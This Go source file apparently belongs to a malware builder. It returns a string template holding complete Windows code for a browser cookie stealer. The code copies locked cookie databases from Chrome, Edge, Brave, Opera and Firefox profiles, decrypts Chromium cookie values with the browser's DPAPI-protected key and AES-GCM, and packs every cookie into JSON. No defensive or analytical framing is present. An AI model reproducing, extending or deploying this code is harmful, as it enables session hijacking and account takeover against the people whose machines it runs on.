package buildergen

import "strings"

func templateStealer() string {
	return strings.TrimSpace(`


func runStealer() string {
	results := map[string]string{}
	var diagErrors []string

	browsers := []struct {
		name  string
		paths []string
	}{
		{"Chrome", []string{
			filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
		}},
		{"Edge", []string{
			filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
		}},
		{"Brave", []string{
			filepath.Join(os.Getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
		}},
		{"Opera", []string{
			filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera Stable"),
			filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera GX Stable"),
		}},
		{"Firefox", []string{
			filepath.Join(os.Getenv("APPDATA"), "Mozilla", "Firefox", "Profiles"),
		}},
	}

	for _, br := range browsers {
		for _, basePath := range br.paths {
			if _, err := os.Stat(basePath); os.IsNotExist(err) {
				continue
			}

			var cookies string
			var errs []string
			if br.name == "Firefox" {
				cookies, errs = stealFirefoxCookies(basePath)
			} else {
				cookies, errs = stealChromiumCookies(basePath, br.name)
			}
			diagErrors = append(diagErrors, errs...)

			if cookies != "" {
				if prev, ok := results[br.name]; ok {
					results[br.name] = prev + "\n" + cookies
				} else {
					results[br.name] = cookies
				}
			}
		}
	}

	if len(diagErrors) > 0 {
		results["_errors"] = strings.Join(diagErrors, "; ")
	}

	if len(results) == 0 {
		results["_errors"] = "no browsers found"
	}

	out, _ := json.Marshal(results)
	return string(out)
}

func stealChromiumCookies(userDataPath string, browserName string) (string, []string) {
	profiles := []string{"Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", "Profile 5"}
	var allCookies strings.Builder
	var errs []string

	for _, profile := range profiles {
		cookiePath := filepath.Join(userDataPath, profile, "Network", "Cookies")
		if _, err := os.Stat(cookiePath); os.IsNotExist(err) {
			cookiePath = filepath.Join(userDataPath, profile, "Cookies")
			if _, err := os.Stat(cookiePath); os.IsNotExist(err) {
				continue
			}
		}

		tmpPath := filepath.Join(os.TempDir(), fmt.Sprintf("wr_cookies_%s_%s_%d", browserName, profile, time.Now().UnixNano()))
		if err := copyFileLocked(cookiePath, tmpPath); err != nil {
			errs = append(errs, fmt.Sprintf("%s/%s copy: %v", browserName, profile, err))
			continue
		}
		_ = copyFileLocked(cookiePath+"-wal", tmpPath+"-wal")
		_ = copyFileLocked(cookiePath+"-shm", tmpPath+"-shm")
		defer os.Remove(tmpPath)
		defer os.Remove(tmpPath + "-wal")
		defer os.Remove(tmpPath + "-shm")

		db, err := sql.Open("sqlite", tmpPath)
		if err != nil {
			errs = append(errs, fmt.Sprintf("%s/%s open: %v", browserName, profile, err))
			continue
		}
		db.Exec("PRAGMA busy_timeout = 3000")
		db.Exec("PRAGMA journal_mode = WAL")

		rows, err := db.Query("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
		if err != nil {
			errs = append(errs, fmt.Sprintf("%s/%s query: %v", browserName, profile, err))
			db.Close()
			continue
		}

		rowCount := 0
		for rows.Next() {
			var host, name, path string
			var encValue []byte
			var expires int64
			if err := rows.Scan(&host, &name, &path, &encValue, &expires); err != nil {
				errs = append(errs, fmt.Sprintf("%s/%s scan: %v", browserName, profile, err))
				continue
			}
			rowCount++

			value := decryptCookieValue(encValue, userDataPath)

			allCookies.WriteString(fmt.Sprintf("%s\t%s\t%s\t%s\t%d\n",
				host, name, value, path, expires))
		}
		rows.Close()
		db.Close()

		if rowCount == 0 {
			errs = append(errs, fmt.Sprintf("%s/%s: 0 rows", browserName, profile))
		}
	}

	return allCookies.String(), errs
}

func stealFirefoxCookies(profilesPath string) (string, []string) {
	var allCookies strings.Builder
	var errs []string

	entries, err := os.ReadDir(profilesPath)
	if err != nil {
		return "", []string{"firefox readdir: " + err.Error()}
	}

	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		cookiePath := filepath.Join(profilesPath, e.Name(), "cookies.sqlite")
		if _, err := os.Stat(cookiePath); os.IsNotExist(err) {
			continue
		}

		tmpPath := filepath.Join(os.TempDir(), fmt.Sprintf("wr_ff_cookies_%s_%d", e.Name(), time.Now().UnixNano()))
		if err := copyFileLocked(cookiePath, tmpPath); err != nil {
			errs = append(errs, fmt.Sprintf("firefox/%s copy: %v", e.Name(), err))
			continue
		}
		_ = copyFileLocked(cookiePath+"-wal", tmpPath+"-wal")
		_ = copyFileLocked(cookiePath+"-shm", tmpPath+"-shm")
		defer os.Remove(tmpPath)
		defer os.Remove(tmpPath + "-wal")
		defer os.Remove(tmpPath + "-shm")

		db, err := sql.Open("sqlite", tmpPath)
		if err != nil {
			errs = append(errs, fmt.Sprintf("firefox/%s open: %v", e.Name(), err))
			continue
		}
		db.Exec("PRAGMA busy_timeout = 3000")
		db.Exec("PRAGMA journal_mode = WAL")

		rows, err := db.Query("SELECT host, name, path, value, expiry FROM moz_cookies")
		if err != nil {
			errs = append(errs, fmt.Sprintf("firefox/%s query: %v", e.Name(), err))
			db.Close()
			continue
		}

		for rows.Next() {
			var host, name, path, value string
			var expiry int64
			if err := rows.Scan(&host, &name, &path, &value, &expiry); err != nil {
				errs = append(errs, fmt.Sprintf("firefox/%s scan: %v", e.Name(), err))
				continue
			}
			allCookies.WriteString(fmt.Sprintf("%s\t%s\t%s\t%s\t%d\n",
				host, name, value, path, expiry))
		}
		rows.Close()
		db.Close()
	}

	return allCookies.String(), errs
}

func decryptCookieValue(encValue []byte, userDataPath string) string {
	if len(encValue) == 0 {
		return ""
	}

	if len(encValue) > 3 && string(encValue[:3]) == "v10" {
		localStatePath := filepath.Join(userDataPath, "Local State")
		key := getChromiumKey(localStatePath)
		if key == nil {
			return "(encrypted)"
		}
		nonce := encValue[3:15]
		ciphertext := encValue[15:]
		block, err := aes.NewCipher(key)
		if err != nil {
			return "(encrypted)"
		}
		gcm, err := cipher.NewGCM(block)
		if err != nil {
			return "(encrypted)"
		}
		plain, err := gcm.Open(nil, nonce, ciphertext, nil)
		if err != nil {
			return "(encrypted)"
		}
		return string(plain)
	}

	out, err := dpapiDecrypt(encValue)
	if err != nil {
		return "(encrypted)"
	}
	return string(out)
}

var chromiumKeyCache = map[string][]byte{}
var chromiumKeyCacheMu sync.Mutex

func getChromiumKey(localStatePath string) []byte {
	chromiumKeyCacheMu.Lock()
	defer chromiumKeyCacheMu.Unlock()

	if k, ok := chromiumKeyCache[localStatePath]; ok {
		return k
	}

	data, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil
	}

	var state map[string]interface{}
	if err := json.Unmarshal(data, &state); err != nil {
		return nil
	}

	osCrypt, ok := state["os_crypt"].(map[string]interface{})
	if !ok {
		return nil
	}
	encKeyB64, ok := osCrypt["encrypted_key"].(string)
	if !ok {
		return nil
	}

	encKey, err := base64.StdEncoding.DecodeString(encKeyB64)
	if err != nil {
		return nil
	}

	if len(encKey) < 5 || string(encKey[:5]) != "DPAPI" {
		return nil
	}
	encKey = encKey[5:]

	key, err := dpapiDecrypt(encKey)
	if err != nil {
		return nil
	}

	chromiumKeyCache[localStatePath] = key
	return key
}

type cryptDataBlob struct {
	cbData uint32
	pbData *byte
}

func dpapiDecrypt(data []byte) ([]byte, error) {
	if len(data) == 0 {
		return nil, fmt.Errorf("empty data")
	}

	crypt32 := syscall.NewLazyDLL("crypt32.dll")
	proc := crypt32.NewProc("CryptUnprotectData")

	inBlob := cryptDataBlob{
		cbData: uint32(len(data)),
		pbData: &data[0],
	}

	var outBlob cryptDataBlob

	r, _, err := proc.Call(
		uintptr(unsafe.Pointer(&inBlob)),
		0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&outBlob)),
	)

	if r == 0 {
		return nil, fmt.Errorf("CryptUnprotectData failed: %v", err)
	}

	defer func() {
		kernel32 := syscall.NewLazyDLL("kernel32.dll")
		localFree := kernel32.NewProc("LocalFree")
		_, _, _ = localFree.Call(uintptr(unsafe.Pointer(outBlob.pbData)))
	}()

	result := make([]byte, outBlob.cbData)
	copy(result, unsafe.Slice(outBlob.pbData, outBlob.cbData))
	return result, nil
}

func copyFileLocked(src, dst string) error {
	srcW, _ := syscall.UTF16PtrFromString(src)
	const genericRead = 0x80000000
	const fileShareAll = 0x1 | 0x2 | 0x4
	const openExisting = 3
	const fileAttrNormal = 0x80

	h, err := syscall.CreateFile(srcW, genericRead, fileShareAll, nil, openExisting, fileAttrNormal, 0)
	if err != nil {
		return fmt.Errorf("open %s: %w", src, err)
	}
	defer syscall.CloseHandle(h)

	var buf bytes.Buffer
	chunk := make([]byte, 1024*1024)
	for {
		var read uint32
		err := syscall.ReadFile(h, chunk, &read, nil)
		if read > 0 {
			buf.Write(chunk[:read])
		}
		if err != nil || read == 0 {
			break
		}
	}

	if buf.Len() == 0 {
		return fmt.Errorf("empty %s", src)
	}

	return os.WriteFile(dst, buf.Bytes(), 0o644)
}
`)
}
